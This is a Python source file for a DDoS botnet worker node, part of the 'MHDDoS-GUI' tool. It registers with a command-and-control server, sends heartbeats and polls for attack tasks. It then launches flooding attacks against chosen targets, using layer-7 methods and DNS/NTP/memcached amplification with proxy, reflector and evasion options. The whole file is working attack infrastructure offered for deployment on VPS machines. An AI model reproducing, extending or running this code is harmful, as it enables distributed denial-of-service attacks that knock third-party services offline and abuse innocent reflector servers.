#!/usr/bin/env python3
"""
MHDDoS-GUI Worker Node — C2 Remote Execution Agent
Deploy on VPS: python worker.py --master http://C2_IP:8000 --token SECRET
"""

import argparse
import asyncio
import json
import logging
import os
import platform
import signal
import subprocess
import sys
import time
from pathlib import Path
from typing import Optional

import psutil
import requests

# --- Configuration ---
__version__ = "1.0.0"
BASE_DIR = Path(__file__).resolve().parent
LOG_FORMAT = "[%(asctime)s - %(levelname)s] %(message)s"

logging.basicConfig(format=LOG_FORMAT, datefmt="%H:%M:%S", level=logging.INFO)
logger = logging.getLogger("Worker")


class WorkerNode:
    """Autonomous worker that connects to a C2 master and executes attack tasks."""

    def __init__(self, master_url: str, token: str, poll_interval: int = 5):
        self.master_url = master_url.rstrip("/")
        self.token = token
        self.poll_interval = poll_interval
        self.node_id: str = ""
        self.active_process: Optional[subprocess.Popen] = None
        self.current_task_id: Optional[str] = None
        self.running = True

        # Generate stable node ID from hostname + MAC
        import uuid
        self.node_id = f"{platform.node()[:8]}-{str(uuid.getnode())[-6:]}"

    @property
    def _headers(self) -> dict:
        return {
            "Authorization": f"Bearer {self.token}",
            "X-Node-ID": self.node_id,
            "Content-Type": "application/json",
        }

    def _system_info(self) -> dict:
        """Collect system metrics for heartbeat."""
        return {
            "node_id": self.node_id,
            "hostname": platform.node(),
            "os": f"{platform.system()} {platform.release()}",
            "cpu_cores": psutil.cpu_count(),
            "cpu_percent": psutil.cpu_percent(interval=0.5),
            "ram_total_mb": round(psutil.virtual_memory().total / (1024 ** 2)),
            "ram_percent": psutil.virtual_memory().percent,
            "python_version": platform.python_version(),
            "worker_version": __version__,
            "status": "busy" if self.active_process else "idle",
            "current_task_id": self.current_task_id,
        }

    def register(self) -> bool:
        """Register this worker with the C2 master."""
        try:
            resp = requests.post(
                f"{self.master_url}/api/c2/register",
                headers=self._headers,
                json=self._system_info(),
                timeout=10,
            )
            if resp.status_code == 200:
                data = resp.json()
                if data.get("status") == "success":
                    logger.info(
                        f"\033[92m[*] REGISTERED with C2 Master: {self.master_url} "
                        f"| Node ID: {self.node_id}\033[0m"
                    )
                    return True
            logger.error(f"[!] Registration rejected: {resp.text}")
            return False
        except requests.ConnectionError:
            logger.error(f"[!] Cannot reach C2 Master at {self.master_url}")
            return False
        except Exception as e:
            logger.error(f"[!] Registration error: {e}")
            return False

    def send_heartbeat(self) -> None:
        """Send periodic health status to C2 master."""
        try:
            requests.post(
                f"{self.master_url}/api/c2/heartbeat",
                headers=self._headers,
                json=self._system_info(),
                timeout=5,
            )
        except Exception:
            logger.warning("[!] Heartbeat failed — master may be offline")

    def poll_for_task(self) -> Optional[dict]:
        """Poll the C2 master for a pending attack task."""
        try:
            resp = requests.get(
                f"{self.master_url}/api/c2/poll",
                headers=self._headers,
                timeout=10,
            )
            if resp.status_code == 200:
                data = resp.json()
                if data.get("task"):
                    return data["task"]
            return None
        except Exception:
            return None

    def execute_task(self, task: dict) -> None:
        """Execute an attack task by running start.py as a subprocess."""
        self.current_task_id = task.get("task_id", "unknown")
        params = task.get("params", {})

        logger.info(
            f"\033[94m[*] TASK RECEIVED: {self.current_task_id} | "
            f"Method: {params.get('method', '?')} | "
            f"Target: {params.get('target', '?')}\033[0m"
        )

        # Build command from params (same logic as api.py build_attack_command)
        command = self._build_command(params)
        if not command:
            logger.error("[!] Failed to build attack command from task params")
            self._report_complete("error", "Invalid task parameters")
            return

        logger.info(f"[*] EXECUTING: {' '.join(command)}")

        try:
            self.active_process = subprocess.Popen(
                command,
                cwd=str(BASE_DIR),
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1,
            )

            import threading
            def monitor_process():
                try:
                    # Stream output
                    for line in iter(self.active_process.stdout.readline, ""):
                        line = line.strip()
                        if line:
                            logger.info(f"  >> {line}")

                    self.active_process.wait()
                    exit_code = self.active_process.returncode
                    logger.info(
                        f"\033[93m[*] TASK COMPLETE: {self.current_task_id} "
                        f"| Exit Code: {exit_code}\033[0m"
                    )
                    self._report_complete("success", f"Exit code: {exit_code}")

                except Exception as e:
                    logger.error(f"[!] Task execution error: {e}")
                    self._report_complete("error", str(e))
                finally:
                    self.active_process = None
                    self.current_task_id = None

            t = threading.Thread(target=monitor_process, daemon=True)
            t.start()

        except Exception as e:
            logger.error(f"[!] Task launch error: {e}")
            self._report_complete("error", str(e))
            self.active_process = None
            self.current_task_id = None

    def _build_command(self, params: dict) -> list:
        """Build start.py command from C2 task parameters."""
        method = params.get("method", "")
        target = params.get("target", "")
        if not method or not target:
            return []

        # Layer classification
        LAYER7 = {
            "BYPASS", "CFB", "GET", "POST", "OVH", "STRESS", "DYN", "SLOW",
            "HEAD", "NULL", "COOKIE", "PPS", "EVEN", "GSB", "DGB", "AVB",
            "CFBUAM", "APACHE", "XMLRPC", "BOT", "BOMB", "DOWNLOADER",
            "KILLER", "TOR", "RHEX", "STOMP", "BROWSER",
        }
        LAYER4_AMP = {"MEM", "NTP", "DNS", "ARD", "CLDAP", "CHAR", "RDP"}

        PROXY_TYPES = {"All Proxy": "0", "HTTP": "1", "SOCKS4": "4", "SOCKS5": "5", "RANDOM": "6"}

        threads = str(params.get("threads", 100))
        duration = str(params.get("duration", 3600))
        proxy_type_code = PROXY_TYPES.get(params.get("proxy_type", "SOCKS5"), "5")
        proxy_list = params.get("proxy_list", "") or "default.txt"
        rpc = str(params.get("rpc", 100))
        reflector = params.get("reflector", "") or "reflector.txt"
        proxy_refresh = str(params.get("proxy_refresh", 0))

        # Logic to pick the correct python executable because the user might have launched the worker 
        # using a global python, but we want the `start.py` to use the venv's python w/ PyRoxy.
        python_exe = sys.executable
        venv_python_win = BASE_DIR / "venv" / "Scripts" / "python.exe"
        venv_python_unix = BASE_DIR / "venv" / "bin" / "python"
        
        if venv_python_win.exists():
            python_exe = str(venv_python_win)
        elif venv_python_unix.exists():
            python_exe = str(venv_python_unix)

        cmd = [python_exe, "-u", "start.py", method, target]

        if method in LAYER7:
            cmd.extend([proxy_type_code, threads, proxy_list, rpc, duration, proxy_refresh])
        elif method in LAYER4_AMP:
            cmd.extend([threads, duration, reflector])
        else:
            # Layer 4 normal
            if proxy_list and proxy_list.strip():
                cmd.extend([threads, duration, proxy_type_code, proxy_list, proxy_refresh])
            else:
                cmd.extend([threads, duration])

        # Optional flags
        if params.get("smart_rpc"):
            cmd.append("--smart")
        if params.get("autoscale"):
            cmd.append("--autoscale")
        if params.get("evasion"):
            cmd.append("--evasion")

        return cmd

    def _report_complete(self, status: str, message: str) -> None:
        """Report task completion to C2 master."""
        try:
            requests.post(
                f"{self.master_url}/api/c2/task_complete",
                headers=self._headers,
                json={
                    "task_id": self.current_task_id,
                    "status": status,
                    "message": message,
                },
                timeout=5,
            )
        except Exception:
            pass

    def stop_current_task(self) -> None:
        """Kill the active attack process."""
        if self.active_process:
            try:
                parent = psutil.Process(self.active_process.pid)
                for child in parent.children(recursive=True):
                    child.kill()
                parent.kill()
                logger.info("[*] Active task terminated by C2 command")
            except psutil.NoSuchProcess:
                pass
            finally:
                self.active_process = None
                self.current_task_id = None

    def run(self) -> None:
        """Main event loop: register → poll → execute → heartbeat."""
        # Register with retry
        for attempt in range(5):
            if self.register():
                break
            logger.warning(f"[!] Retrying registration ({attempt + 1}/5)...")
            time.sleep(3)
        else:
            logger.error("[!] FATAL: Could not register with C2 Master. Exiting.")
            sys.exit(1)

        logger.info(
            f"\033[96m[*] Worker online — polling every {self.poll_interval}s\033[0m"
        )

        heartbeat_counter = 0
        while self.running:
            try:
                # Poll for tasks
                task = self.poll_for_task()
                if task:
                    action = task.get("action", "attack")
                    if action == "attack":
                        self.execute_task(task)
                    elif action == "stop":
                        self.stop_current_task()
                    elif action == "shutdown":
                        logger.info("[*] Shutdown command received from C2. Exiting.")
                        self.stop_current_task()
                        self.running = False
                        break

                # Heartbeat every 3 poll cycles
                heartbeat_counter += 1
                if heartbeat_counter >= 3:
                    self.send_heartbeat()
                    heartbeat_counter = 0

                time.sleep(self.poll_interval)

            except KeyboardInterrupt:
                logger.info("\n[*] Worker shutting down...")
                self.stop_current_task()
                break
            except Exception as e:
                logger.error(f"[!] Loop error: {e}")
                time.sleep(self.poll_interval)


def main():
    parser = argparse.ArgumentParser(
        description="MHDDoS-GUI Worker Node — C2 Remote Execution Agent",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Examples:\n"
            "  python worker.py --master http://192.168.1.100:8000 --token mysecret\n"
            "  python worker.py --master http://c2.example.com:8000 --token s3cr3t --interval 3\n"
        ),
    )
    parser.add_argument(
        "--master", required=True, help="C2 master URL (e.g. http://IP:8000)"
    )
    parser.add_argument(
        "--token", required=True, help="Authentication token (must match C2 master)"
    )
    parser.add_argument(
        "--interval", type=int, default=5, help="Poll interval in seconds (default: 5)"
    )

    args = parser.parse_args()

    print(
        "\033[95m"
        "╔══════════════════════════════════════════╗\n"
        "║    MHDDoS-GUI Worker Node v" + __version__ + "         ║\n"
        "║    C2 Remote Execution Agent             ║\n"
        "╚══════════════════════════════════════════╝"
        "\033[0m"
    )

    worker = WorkerNode(
        master_url=args.master,
        token=args.token,
        poll_interval=args.interval,
    )

    # Graceful shutdown on SIGTERM (for systemd/docker)
    def handle_signal(sig, frame):
        logger.info(f"\n[*] Signal {sig} received. Shutting down...")
        worker.running = False
        worker.stop_current_task()

    signal.signal(signal.SIGTERM, handle_signal)
    signal.signal(signal.SIGINT, handle_signal)

    worker.run()


if __name__ == "__main__":
    main()
